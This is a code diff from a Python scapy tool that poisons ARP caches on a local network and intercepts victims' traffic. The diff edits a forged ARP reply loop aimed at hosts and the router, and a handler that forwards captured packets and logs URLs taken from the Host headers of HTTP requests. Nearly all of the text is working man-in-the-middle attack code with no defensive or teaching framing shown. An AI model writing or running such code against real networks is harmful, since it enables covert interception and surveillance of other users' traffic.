@@ -33,15 +33,15 @@ def handle_Packet(pkt):
         functions.sendPacket(pkt,gatewayMAC)
 
         if TCP in pkt:
-            if 80 == pkt[TCP].dport:
-                pkt.show()
+            if 80 == pkt[TCP].dport: #check if packet is http packet
+                #pkt.show()
                 logging.info("HTTP:"+ pkt.summary())
-                url=pkt[Raw].split('Host:')[1].split('\\r\\n')[0]
-                logging.info("URL:"+url)
-        else:
-            functions.sendPacket(pkt,gatewayMAC)
+                try:
+                    url=str(raw(pkt)).split('Host:')[1].split('\\r\\n')[0]
+                    logging.info("URL:"+url)
+                except Exception as exc:
+                    logging.info('failed to extract url, '+str(exc))
 
-        functions.sendPacket(pkt,gatewayMAC)
 
 
     else:
@@ -72,10 +72,11 @@ def arpSpoof(router,localHost):
                     victimPacket = Ether()/ARP(op=2,psrc = router, pdst=host)#creante arp packets
                     gatewayPacket=Ether()/ARP(op=2,psrc=host,pdst=router)
                     logging.debug('spoofing: '+victimPacket[ARP].pdst)
-                    sendp(victimPacket)#send packets
-                    sendp(gatewayPacket)
+                    sendp(victimPacket,verbose=0)#send packets
+                    sendp(gatewayPacket,verbose=0)
 
             addressesLock.release()
+            print 'done spoofing'
             sleep(30)
 
 
